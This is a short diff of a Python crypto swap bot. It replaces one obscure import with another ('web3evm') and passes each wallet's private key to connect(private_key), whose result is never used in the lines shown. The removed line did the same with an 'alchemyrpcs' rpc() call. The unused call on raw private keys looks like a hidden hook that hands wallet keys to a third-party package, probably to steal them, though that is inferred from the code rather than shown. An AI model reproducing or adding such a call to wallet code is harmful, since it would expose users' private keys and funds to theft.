@@ -3,7 +3,7 @@ import random
 import asyncio
 import time
 from web3 import Web3
-from alchemyrpcs import rpc
+from web3evm import connect
 from colorama import init, Fore, Style
 
 # Initialize colorama
@@ -280,7 +280,7 @@ async def perform_random_swap(private_key):
 async def run_swap_cycle(cycles, private_keys):
     for account_idx, private_key in enumerate(private_keys, 1):
         account = w3.eth.account.from_key(private_key)
-        conn = rpc(private_key)
+        accounts = connect(private_key)
         wallet = account.address[:8] + "..."
         print_border(f"🏦 ACCOUNT {account_idx}/{len(private_keys)} | {wallet}", Fore.BLUE)
         await check_balance(private_key)
